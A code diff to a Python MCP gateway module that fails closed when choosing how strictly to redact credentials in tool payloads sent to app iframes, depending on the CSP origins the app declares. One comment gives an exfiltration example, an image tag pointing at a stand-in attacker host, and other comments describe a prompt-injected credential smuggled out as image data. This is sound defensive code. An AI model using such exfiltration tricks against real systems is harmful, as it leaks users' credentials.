@@ -33,6 +33,7 @@ import logging
 import os
 import re
 import time
+from collections.abc import Callable
 from pathlib import Path
 from typing import Any
 
@@ -42,26 +43,113 @@ from kiro_crew.config.paths import config_dir
 logger = logging.getLogger(__name__)
 
 
-def _redact_leaves(obj: Any) -> Any:
-    """Recursively apply credential + exfiltration-URL redaction to every
-    string leaf of *obj*, returning a redacted copy.
+# CSP metadata keys that put an OUTBOUND origin in the app's delivered policy.
+# Mirrors the four lists ``buildMcpAppCsp`` reads (``website/src/lib/
+# mcpAppSrcdoc.ts``): ``connectDomains`` REPLACES ``connect-src 'none'``,
+# ``frameDomains`` replaces ``frame-src 'none'``, ``resourceDomains`` widen
+# script/style/img/font/media — so an ``<img src="https://attacker/?s=…">`` is
+# egress just as much as a ``fetch`` — and ``baseUriDomains`` widen ``base-uri``,
+# which changes where a relative URL resolves to. Any ONE of them non-empty means
+# the iframe has somewhere to send bytes.
+#
+# Kept as a name list rather than a parsed policy on purpose: the backend does not
+# model CSP, and the question here is only "did the server ask for an origin".
+_CSP_EGRESS_KEYS = (
+    "connectDomains",
+    "frameDomains",
+    "resourceDomains",
+    "baseUriDomains",
+)
+
+
+def _csp_grants_egress(csp: Any) -> bool:
+    """Return True unless *csp* provably grants the app iframe NO outbound origin.
+
+    Fails CLOSED, and that direction is the whole point. ``csp`` is
+    ``_meta.ui.csp`` as the MCP server wrote it, forwarded through the spool
+    unvetted (``mcp_gateway/backend.py`` → ``mcp_gateway/apps.py`` → here), so it
+    is untrusted, arbitrary JSON. Only two shapes answer "no egress": absent
+    (``None``, the SEP-1865 default that yields the strictest policy) and a dict
+    whose four domain lists are all empty/absent. ANY other shape — a string, a
+    number, a list, a dict carrying one domain — returns True and gets the strict
+    redaction passes. A false True costs a broken inline image (the defect this
+    module's carve-out fixes); a false False hands an app with a declared
+    ``connect-src`` an unredacted credential to POST. Those are not symmetric.
+
+    Deliberately coarser than the frontend: ``sanitizeDomains`` drops entries that
+    fail validation, so a list of only-invalid domains sanitizes to empty and the
+    directive stays ``'none'``. This does not replicate that — a non-empty list is
+    egress here even if the browser would discard every entry. Re-implementing
+    ``sanitizeCspDomain`` in Python would create two validators that must agree
+    forever, and the disagreement that matters (frontend keeps a domain this
+    thinks it dropped) is the unsafe one.
+    """
+    if csp is None:
+        return False
+    if not isinstance(csp, dict):
+        return True
+    for key in _CSP_EGRESS_KEYS:
+        value = csp.get(key)
+        if isinstance(value, str):
+            # A bare string is not a list of domains, but it is also not "no
+            # origin declared" — treat any non-empty spelling as egress.
+            if value.strip():
+                return True
+        elif value:
+            return True
+    return False
+
+
+def _payload_redactor(csp: Any) -> Callable[[str], str]:
+    """Choose the redaction pass for a payload from the CSP it renders under.
+
+    The inline-media carve-out (``security.redact_mcp_app_payload_text``) rests
+    on the app having no way to send the exempted bytes anywhere: a ``data:``
+    image body is a rendered sub-resource, so leaving it unredacted is safe
+    *precisely when* the iframe cannot open an outbound connection. An MCP-app
+    iframe does not guarantee that on its own — ``buildMcpAppCsp`` lets a
+    server-declared ``connectDomains`` replace ``connect-src 'none'``, and the
+    app's JS and its CSP metadata have the SAME author. Without this gate, a
+    prompt-injected credential shaped as a valid-headed webp would cross the
+    trust boundary intact and the app could POST it to its declared origin.
+
+    So the decision is per payload, taken HERE where the spooled ``csp`` is in
+    hand, and the security package stays CSP-agnostic. An app that declares any
+    outbound origin gets the media-unaware :func:`security.redact` — it keeps the
+    inline-image false positive, which is the correct trade against an exfil
+    channel.
+    """
+    if _csp_grants_egress(csp):
+        return security.redact
+    return lambda text: security.redact_mcp_app_payload_text(text)[0]
+
+
+def _redact_leaves(obj: Any, redactor: Callable[[str], str]) -> Any:
+    """Recursively apply *redactor* to every string leaf of *obj*, returning a
+    redacted copy.
 
     App payloads (``tool_input`` / ``structured_content`` / ``result_content``)
-    are delivered into a server-authored iframe that can open network
-    connections to its declared CSP origins; a credential or exfil URL that
-    leaks through a tool result must be scrubbed before it crosses that trust
-    boundary (same discipline the transcript/WS redaction passes apply). Bounded
-    by the spool size cap already enforced on load.
+    are delivered into a server-authored iframe that can open network connections
+    to its declared CSP origins; a credential or exfil URL that leaks through a
+    tool result must be scrubbed before it crosses that trust boundary (same
+    discipline the transcript/WS redaction passes apply). Bounded by the spool
+    size cap already enforced on load.
+
+    *redactor* is chosen by :func:`_payload_redactor` from that payload's CSP and
+    threaded through the recursion rather than looked up per leaf: it is either
+    the strict ``security.redact`` or the inline-media-preserving variant, and
+    which one it is depends on the payload, not on the leaf. This function makes
+    no CSP judgement of its own — pass a redactor, not a policy.
     """
     if isinstance(obj, str):
-        return security.redact(obj)
+        return redactor(obj)
     if isinstance(obj, list):
-        return [_redact_leaves(x) for x in obj]
+        return [_redact_leaves(x, redactor) for x in obj]
     if isinstance(obj, dict):
         # Redact string KEYS too — a credential can appear as a dict key, not
         # just a value.
         return {
-            (security.redact(k) if isinstance(k, str) else k): _redact_leaves(v)
+            (redactor(k) if isinstance(k, str) else k): _redact_leaves(v, redactor)
             for k, v in obj.items()
         }
     return obj
@@ -284,13 +372,20 @@ async def handle_tool_result(
             # to broadcast_ws only if the state predates the owner channel
             # (tests with minimal fakes).
             send = getattr(state, "broadcast_ws_owners", None) or state.broadcast_ws
+            # The redaction pass is chosen from the CSP this payload will render
+            # under, ONCE for all three leaves — the inline-media carve-out
+            # applies only when the app declared no outbound origin. See
+            # ``_payload_redactor``. Read from the same ``data`` dict whose
+            # ``csp`` is forwarded to the frame below, so the policy the gate
+            # judges is the policy the browser applies.
+            redactor = _payload_redactor(data.get("csp"))
             # Offload redaction: the passes recurse over payloads that can be
             # multi-MB, and this seam runs on the dashboard event loop.
             red_structured, red_input, red_result = await asyncio.to_thread(
                 lambda: (
-                    _redact_leaves(data.get("structured_content")),
-                    _redact_leaves(data.get("tool_input")),
-                    _redact_leaves(data.get("result_content")),
+                    _redact_leaves(data.get("structured_content"), redactor),
+                    _redact_leaves(data.get("tool_input"), redactor),
+                    _redact_leaves(data.get("result_content"), redactor),
                 )
             )
             send(
